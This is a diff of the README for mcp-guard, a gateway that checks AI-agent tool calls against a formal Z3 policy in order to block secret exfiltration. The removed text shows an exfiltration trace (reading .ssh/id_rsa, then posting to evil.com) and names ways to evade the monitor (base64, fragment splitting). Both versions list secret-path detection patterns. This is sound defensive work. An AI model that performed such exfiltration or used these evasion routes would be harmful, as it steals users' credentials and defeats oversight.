@@ -1,249 +1,244 @@
 # mcp-guard
 
-MCP-гейтвей: один stdio-сервер перед несколькими апстрим MCP-серверами.
+An MCP gateway that fronts several MCP servers behind one connection and checks
+every tool call against a formal policy before forwarding it.
 
 ```
-Claude / Cursor / любой MCP Client
+Claude / Cursor / your own agent
               │  stdio
               ▼
        ┌─────────────────┐
-       │   mcp-gateway   │
-       │  tools/list     │
-       │  tools/call     │
-       │      ▼          │
-       │  policy/check   │
+       │    mcp-guard    │──▶ policy check
        └──────┬──────────┘
        ┌──────┼──────────┐
        ▼      ▼          ▼
      MCP A  MCP B      MCP C
 ```
 
-## Запуск
+The client sees one server. Tools keep their upstream as a prefix — `github`'s
+`create_issue` arrives as `github__create_issue`.
 
-Два локальных YAML — список серверов и политика. Аргументов не нужно:
+The policy is not a list of forbidden tools. It is a state machine checked by an
+SMT solver, so it can forbid a *sequence* whose steps are each unremarkable:
+
+```
+ALLOW fs__read_file      "path"="…/README.md"        tainted=False
+ALLOW github__create_pull_request
+ALLOW fs__read_file      "path"="…/.env"             tainted=True
+DENY  github__create_pull_request   fails guard 'publish_to_github'
+DENY  docs__query-docs              fails guard 'query_third_party_docs'
+```
+
+The secret was read through one server and the exits closed on two others. No
+per-server config can express that — no single server sees both halves.
+
+Implements **ePCA** (Executable Proof-Constrained Action) from
+[Wu et al., *Provably Secure Agent Guardrail*](https://arxiv.org/abs/2605.29251).
+A policy file is a deterministic transition system
+
+$$\Sigma = \langle S_{ver},\ A,\ \delta,\ s_0,\ \Phi_{safe} \rangle$$
+
+— a state space of security-relevant attributes, a finite set of actions, a
+transition $\delta : S_{ver} \times A \to S_{ver}$, an initial state, and the
+invariants. Each call becomes a typed payload $j$, is translated into
+first-order logic by a fixed table, and Z3 decides the joint formula
+
+$$C = s \ \wedge\ ⟦j⟧_{SMT} \ \wedge\ \Phi_{safe}(s') \qquad s' = \delta(s, a)$$
+
+against the state the call *would* produce. SAT forwards it and commits the
+transition; UNSAT is the paper's algebraic deadlock — blocked, state unchanged.
+No language model takes part in the decision.
+
+## Install
 
 ```bash
-cp examples/mcp-guard.yaml        mcp-guard.yaml          # серверы
-cp examples/mcp-guard-policy.yaml mcp-guard-policy.yaml   # ограничения
-uv run mcp-guard
+uv tool install mcp-guard      # or: pip install mcp-guard
 ```
 
-Порядок поиска, для каждого файла свой: `$MCP_GUARD_CONFIG` → `./mcp-guard.yaml`/`.yml` →
-`~/.config/mcp-guard/mcp-guard.yaml`/`.yml`, и `$MCP_GUARD_POLICY` → `./mcp-guard-policy.yaml`/`.yml` →
-`~/.config/mcp-guard/mcp-guard-policy.yaml`/`.yml`. Явно — `--config PATH` и `--policy PATH`.
-Без файла политики гейтвей форвардит всё и предупреждает об этом в лог.
+Python 3.12+.
 
-В конфиге MCP-клиента:
+## Run
 
-```json
-{
-  "mcpServers": {
-    "guard": {
-      "command": "uv",
-      "args": ["run", "--directory", "/path/to/mcp-guard", "mcp-guard"],
-      "env": {
-        "MCP_GUARD_CONFIG": "/path/to/mcp-guard.yaml",
-        "MCP_GUARD_POLICY": "/path/to/mcp-guard-policy.yaml"
-      }
-    }
-  }
-}
+Two files, both required, each from its flag or its environment variable. There
+are no default locations: running unverified should be something you asked for.
+
+```bash
+mcp-guard --config mcp-guard.yaml --policy mcp-guard-policy.yaml
 ```
 
-## Конфиг
+| Flag | Environment | |
+| --- | --- | --- |
+| `--config PATH` | `MCP_GUARD_CONFIG` | Upstream servers |
+| `--policy PATH` | `MCP_GUARD_POLICY` | ePCA policy |
+| `--env-file PATH` | `MCP_GUARD_ENV_FILE` | `KEY=value` lines loaded before the config |
+| `--http [HOST:]PORT` | | Serve over streamable HTTP instead of stdio |
+| `--log-arguments` | | `none`, `redacted` (default), `full` |
+| `--log-level` | | Default `INFO`; logs go to stderr |
+| `--color` | | `auto` (default), `always`, `never` |
+
+You do not start it yourself: the client spawns it, and it spawns its own local
+upstreams in turn.
+
+## Server config
+
+Each key under `servers` is that server's tool-name prefix. A server is either a
+local subprocess (`command`) or a remote endpoint (`url`) — exactly one.
 
 ```yaml
 servers:
-  # без аутентификации — короткая форма
-  public: https://public.example.com/mcp
+  fs:                                    # local, stdio
+    command: npx
+    args: ["-y", "@modelcontextprotocol/server-filesystem", "${HOME}/work"]
+    # env: {TOKEN: "${TOKEN}"}, cwd: /some/dir
 
-  # bearer-токен из переменной окружения -> Authorization: Bearer <token>
-  internal:
-    url: https://internal.example.com/mcp
-    token_env: INTERNAL_MCP_TOKEN
+  github:                                # remote, bearer token
+    url: https://api.githubcopilot.com/mcp/
+    token_env: GITHUB_MCP_TOKEN
 
-  # произвольные заголовки; ${VAR} подставляется из окружения
-  github:
-    url: https://api.example.com/mcp
+  internal:                              # remote, other headers
+    url: https://mcp.internal.example.com/mcp
     headers:
-      Authorization: Bearer ${GITHUB_MCP_TOKEN}
+      X-Api-Key: ${INTERNAL_API_KEY}
 
-  search:
-    url: https://search.example.com/mcp
-    headers:
-      X-Api-Key: ${SEARCH_MCP_KEY}
+  docs: https://mcp.context7.com/mcp     # no credentials
 ```
 
-Ключ под `servers` — это префикс имён тулов: `github` + `create_issue` уходит клиенту
-как `github__create_issue`. `tools/call` разбирается обратно в `(апстрим, исходное имя)`
-и форвардится владельцу.
+Credentials in order: `headers`, `token` (a literal — prefer the others),
+`token_env`, then `MCP_GUARD_TOKEN_<NAME>`. `${VAR}` expands from the
+environment anywhere in the file and is strict — an unset variable stops startup
+rather than connecting without the credential. Header values never reach the
+log, only their names. Unknown keys are rejected, because a misspelled `headers`
+would otherwise mean a silently unauthenticated upstream.
 
-Полный пример с комментариями — [examples/mcp-guard.yaml](examples/mcp-guard.yaml).
-
-### Аутентификация
-
-Поля на сервер, в порядке приоритета:
-
-| Поле | Что делает |
-| --- | --- |
-| `headers` | Отправляются как есть. Свой `Authorization` здесь отключает всё ниже. |
-| `token` | Литеральный токен → `Authorization: Bearer <token>`. |
-| `token_env` | Имя переменной окружения с токеном. Пустая/несуществующая → ошибка старта. |
-| — | Фоллбэк: `MCP_GUARD_TOKEN_<NAME>` (`MCP_GUARD_TOKEN_GITHUB` для `github`), если задана. |
-
-`${VAR}` работает в любой строке конфига, так что секреты можно не хранить в файле.
-Значения заголовков никогда не пишутся в логи — только их имена. Токены резолвятся при
-старте, поэтому опечатка в `token_env` — это внятная ошибка конфига (`exit 2`), а не
-падение соединения потом. `mcp-guard.yaml` в `.gitignore`.
-
-OAuth (динамические токены с refresh) конфигом не покрыт: под него в `UpstreamAuth`
-есть поле `httpx_auth` — туда кладётся `mcp.client.auth.OAuthClientProvider` при
-программном использовании.
-
-## Политика: формальная верификация вызовов
-
-Отдельный файл `mcp-guard-policy.yaml`. Реализует **ePCA** (Executable Proof-Constrained
-Action) из [Wu et al., *Provably Secure Agent Guardrail*](https://arxiv.org/abs/2605.29251):
-допуск действия решается не суждением модели, а выполнимостью формулы в SMT-солвере.
-
-Гейтвей — ровно та точка полного посредничества, которую статья постулирует: каждый
-вызов сериализуется в типизированный payload, детерминированно транслируется в
-first-order logic и проверяется Z3 против аксиом, написанных человеком. Модель в
-контуре решения не участвует.
-
-```
-tools/call ──▶ 1. схема      аргументы против объявленных типов; не типизируется → deny
-               2. ⟦j⟧_SMT    YAML-выражения → термы Z3 (whitelist AST, без eval)
-               3. солвер     C = s ∧ ⟦j⟧_SMT ∧ Φ_safe(s')
-               4. гейт       SAT → форвард + коммит δ(s,a)
-                             UNSAT → блок, состояние не двигается
-```
-
-Ключевое: инварианты проверяются на **индуцированном** состоянии `s'`, а само состояние
-живёт между вызовами. Поэтому ловятся атаки, разбитые на безобидные по отдельности шаги:
-
-```
-fs__read_file  {"path": "/home/u/README.md"}        ALLOW
-http__post     {"url": "https://api.example.com"}   ALLOW   ← до taint исходящий разрешён
-fs__read_file  {"path": "/home/u/.ssh/id_rsa"}      ALLOW   ← но ставит tainted=true
-http__post     {"url": "https://evil.com"}          DENY    ← fails guard 'outbound_request'
-```
-
-Запрещена не любая из операций, а их последовательность — этого stateless-проверка не видит.
-
-### Из чего состоит файл
-
-| Секция | Смысл в терминах статьи |
-| --- | --- |
-| `state` | `S_ver` и начальное состояние `s₀` — security-релевантная проекция мира: `tainted`, счётчики |
-| `invariants` | `Φ_safe` — должны выполняться в каждом достижимом состоянии |
-| `actions` | `A` и `δ`: `match` (glob по имени тула), `requires` (охрана), `effect` (переход) |
-| `patterns` | именованные списки подстрок для `matches()` |
-| `default` | `allow` или `deny` для тулов без аксиом |
-
-Грамматика выражений: литералы, арифметика, сравнения (в т.ч. цепочки), `and/or/not`,
-и функции `implies`, `ite`, `startswith`, `endswith`, `contains`, `matches`, `member`.
-Парсится парсером Python и переводится в Z3 через whitelist AST-узлов — **`eval` не
-используется**, всё вне грамматики падает при старте:
-
-```
-policy p.yaml, invariant 'i': unknown function '<expression>'; available: implies, ite, ...
-policy p.yaml, invariant 'i': unknown name 'y'; in scope: x
-policy p.yaml, action 'a': effect on 'x' must produce int, got Bool from 'true'
-```
-
-В области видимости `requires`/`effect` — переменные состояния, объявленные в `args`
-аргументы, и всегда `payload` (аргументы вызова как JSON), `tool`, `upstream`. `payload`
-позволяет писать правила, не зная сигнатур чужих тулов:
+## Policy
 
 ```yaml
-actions:
+default: allow          # unmatched tools are forwarded, logged as PASS
+
+patterns:               # named substring lists for matches()
+  secret_paths: ["/.ssh", "/.env", "id_rsa", ".pem", ".aws/"]
+
+state:                  # S_ver and the initial state s₀
+  tainted: {type: bool, init: false}
+  secret_reads: {type: int, init: 0}
+
+invariants:             # Φ_safe — must hold in every reachable state
+  - name: secret_read_budget
+    expr: secret_reads <= 5
+
+actions:                # A and δ; `match` globs the prefixed tool name
   - name: read_files
-    match: ["*__read*", "*__cat", "*__glob"]
+    match: [fs__read_file, fs__read_text_file]
     effect:
       tainted: tainted or matches(payload, secret_paths)
+      secret_reads: secret_reads + ite(matches(payload, secret_paths), 1, 0)
 
-  - name: outbound_request
-    match: ["*__post", "http__*"]
-    requires: implies(tainted, matches(payload, internal_hosts))
+  - name: no_writes_after_secret_read
+    match: [fs__write_file, fs__edit_file, fs__move_file]
+    requires: not tainted
 ```
 
-Инварианты пишутся только над состоянием — `payload` там намеренно вне области
-видимости: `Φ_safe` это свойство состояния, а не отдельного вызова.
+Invariants are checked against the state a call *would produce*, and that state
+persists between calls — that is what catches the split attack. Every action
+whose glob matches contributes; guards are conjoined, effects merged.
 
-Полный пример — [examples/mcp-guard-policy.yaml](examples/mcp-guard-policy.yaml):
-чтение `.ssh`/`.env`/`.pem`, чувствительные таблицы БД, запрет исходящих и мессенджеров
-после такого чтения, запрет перезаписи секретных путей, бюджеты на число чтений.
+In scope for `requires` and `effect`: state variables, arguments declared under
+`args`, and always `payload` (the arguments as JSON), `tool`, `upstream`.
+Matching `payload` makes a rule work without knowing a server's argument names.
+Invariants see only the state. A guard of `"false"` never holds — that is how
+you refuse a tool outright.
 
-### Отказ
-
-Причина берётся из **unsat-core** Z3, поэтому называет конкретную нарушенную аксиому,
-а не «denied»:
-
-```
-mcp-guard blocked 'fs__post': fails guard 'outbound_request'
-  [state: tainted=True, secret_reads=1, external_calls=1]
-mcp-guard blocked 'fs__read_file': violates invariant 'secret_read_budget' (secret_reads <= 5)
-  [state: tainted=True, secret_reads=5, external_calls=0]
-```
-
-Отказ приходит клиенту как `CallToolResult` с `is_error=True`, а не исключением, — модель
-видит причину и может среагировать.
-
-### Границы гарантии
-
-Честно о том, что доказано, а что предполагается — в статье это Assumptions 1–2:
-
-- Гарантия условная: она держится **при условии**, что аксиомы описывают то, что вы
-  имели в виду, и что абстракция состояния не потеряла существенное. Солвер проверяет
-  соответствие вызова аксиомам, а не то, что аксиомы правильные.
-- `matches()` работает по подстрокам JSON-payload'а. Это устойчиво к незнанию чужих
-  сигнатур, но обходится кодированием (base64, склейка из кусков). Против такого нужны
-  аксиомы на конкретные аргументы через `args`.
-- Состояние живёт в памяти процесса и сбрасывается при рестарте гейтвея.
-- Переход δ коммитится на SAT, **до** вызова апстрима: если апстрим упал или потерял
-  ответ, действие всё равно засчитано. Сбой не должен снимать taint.
-- Латентность решения ~3.5 мс (в статье 0.44 мс — там формула без строковой теории).
-  На фоне 12–130 мс до апстрима это шум, но это не ноль.
-
-## Устройство
-
-| Файл | Что внутри |
+| | |
 | --- | --- |
-| [mcp_guard/gateway.py](mcp_guard/gateway.py) | `MCPGateway` — держит апстримы, их клиентов и тулы; `list_tools()`, `resolve()`, `call_tool()` |
-| [mcp_guard/policy.py](mcp_guard/policy.py) | интерфейс `Policy.check_tool_call()` и базовая политика, пускающая всё |
-| [mcp_guard/epca/expr.py](mcp_guard/epca/expr.py) | грамматика выражений → термы Z3 |
-| [mcp_guard/epca/spec.py](mcp_guard/epca/spec.py) | `Σ = ⟨S_ver, A, δ, s₀, Φ_safe⟩` из YAML, компиляция при старте |
-| [mcp_guard/epca/monitor.py](mcp_guard/epca/monitor.py) | reference monitor: формула, решение, коммит перехода |
-| [mcp_guard/epca/policy.py](mcp_guard/epca/policy.py) | `EPCAPolicy` — монитор за интерфейсом `Policy` |
-| [mcp_guard/auth.py](mcp_guard/auth.py) | `UpstreamAuth` — резолв кредов в HTTP-заголовки |
-| [mcp_guard/config.py](mcp_guard/config.py) | чтение и валидация обоих YAML |
-| [mcp_guard/server.py](mcp_guard/server.py) | lowlevel MCP-сервер поверх stdio, хендлеры проксируют в гейтвей |
-| [mcp_guard/cli.py](mcp_guard/cli.py) | точка входа |
+| literals | `1`, `-2`, `true`, `false`, `"text"` |
+| arithmetic | `+ - * // %` |
+| comparison | `< <= > >= == !=`, chainable |
+| boolean | `and`, `or`, `not` |
+| functions | `implies(a,b)`, `ite(c,a,b)`, `startswith`, `endswith`, `contains`, `matches(s, patterns)`, `member(x, [..])` |
 
-Использование напрямую, без stdio-сервера:
+Expressions are parsed by Python's parser and walked into Z3 through a strict
+node whitelist — **`eval` is never used**, and anything outside the grammar
+fails at startup. Denials name the axiom from Z3's unsat core and reach the
+client as `is_error=True`, so the model can adapt:
+
+```
+mcp-guard blocked 'fs__write_file': fails guard 'no_writes_after_secret_read'
+  [state: tainted=True, secret_reads=1]
+```
+
+## Claude Code
+
+```bash
+claude mcp add guard \
+  --env MCP_GUARD_CONFIG=/path/to/mcp-guard.yaml \
+  --env MCP_GUARD_POLICY=/path/to/mcp-guard-policy.yaml \
+  -- uv run --directory /path/to/mcp-guard mcp-guard
+```
+
+Remove the direct entries for any server you put behind the gateway — two paths
+to the same data means the policy is decoration. The same applies to the
+built-in `Bash`, `Read` and `Write` tools: they bypass the gateway, and asking
+the model to prefer the MCP tools is a request, not a control. Close them with
+`permissions.deny` or a `PreToolUse` hook if the guarantee is meant to be real.
+
+## Pydantic AI
 
 ```python
-from mcp_guard import EPCAPolicy, MCPGateway, load_policy_spec, load_upstreams
+from pydantic_ai import Agent
+from pydantic_ai.mcp import MCPToolset, StdioTransport
 
-gateway = MCPGateway(
-    load_upstreams("mcp-guard.yaml"),
-    policy=EPCAPolicy(load_policy_spec("mcp-guard-policy.yaml")),
+guard = MCPToolset(
+    StdioTransport(
+        command="uv",
+        args=["run", "--directory", "/path/to/mcp-guard", "mcp-guard"],
+        env={"MCP_GUARD_CONFIG": "…", "MCP_GUARD_POLICY": "…"},
+    ),
+    tool_error_behavior="failed",
 )
-async with gateway:
-    result = await gateway.call_tool("github__search", {"q": "hi"})
+
+agent = Agent("anthropic:claude-sonnet-4-6", toolsets=[guard])
+async with agent:
+    result = await agent.run("read the config and open a PR")
 ```
 
-Своя политика вместо ePCA — любой подкласс `Policy` в `MCPGateway(..., policy=...)`.
-`check_tool_call` синхронная: под одним event loop гейтвея проверка и коммит состояния
-не могут переслоиться с другим вызовом.
+`tool_error_behavior="failed"` matters: the default retries a denied call until
+the run dies instead of letting the model see the refusal. An agent you build
+yourself is where mediation is actually complete — its tool list is whatever you
+give it, so don't hand it a shell alongside.
 
-Логи идут в stderr: stdout занят транспортом.
+## Audit log
 
-## Что не сделано
+One line per call: verdict, tool, arguments, the rule that fired, the state
+after, upstream latency. Logs go to stderr; stdout belongs to the MCP transport.
 
-- OAuth-флоу в конфиге — только статические креды (см. выше).
-- Персистентность состояния верификатора между рестартами.
-- Проксирование ресурсов и промптов — только тулы.
-- `notifications/tools/list_changed` от апстримов: список тулов читается один раз при
-  подключении, обновление — вручную через `refresh_tools()`.
+```
+ALLOW fs__read_file    "path"="…/notes.md"                [read_files] tainted=False   7ms
+ALLOW fs__write_file   "path"="…/api.txt", "token"="***"  [never_write_secret_paths]   8ms
+DENY  fs__write_file   "path"="…/copy.txt"   fails guard 'no_writes_after_secret_read'
+PASS  fs__list_directory                     no policy action covers this tool         5ms
+```
+
+`--log-arguments redacted` (default) blanks credential-shaped keys and shortens
+long values from the middle, keeping both ends. `full` writes them verbatim.
+
+## Transports
+
+stdio is the right answer almost always: it works for local and remote upstreams
+alike, gives each client its own state, and opens no port. `--http` makes the
+gateway a standalone shared process — but all clients then share one verification
+state, there is no authentication, and path-based tools break, since a path is a
+string interpreted on the far side.
+
+## Examples
+
+Tool names in these were taken from live connections, not documentation — the
+two differ.
+
+| | |
+| --- | --- |
+| [examples/filesystem](examples/filesystem) | Local `npx` server. Reading a secret taints; writes close after it. |
+| [examples/github](examples/github) | Remote, 44 tools. Read-here-publish-there, review comments included. |
+| [examples/etherscan](examples/etherscan) | Remote, all 20 tools read-only — a policy with little to forbid, so budgets and an audit trail. |
+| [examples/mixed](examples/mixed) | All of the above plus a public server, 80 tools. Cross-server taint. |
+
+
